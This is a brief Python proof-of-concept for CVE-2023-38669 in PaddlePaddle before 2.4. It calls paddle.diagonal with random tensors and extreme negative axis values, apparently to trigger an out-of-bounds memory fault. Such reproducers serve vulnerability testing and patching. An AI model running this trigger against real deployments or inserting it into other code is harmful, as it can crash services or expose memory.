#CVE: CVE-2023-38669
#VERSION: < 2.4

import paddle
import numpy as np
from paddle import diagonal

x = paddle.to_tensor(np.random.uniform(-10, 10, [1, 1, 1, 1]).astype(np.int64))
offset = paddle.to_tensor(np.random.uniform(-10, 0, []).astype(np.int32))
axis1 = paddle.to_tensor(np.random.uniform(-1000000, 0, []).astype(np.int32))
axis2 = paddle.to_tensor(np.random.uniform(-10000000, 0, []).astype(np.int32))

diagonal(x, offset, axis1, axis2)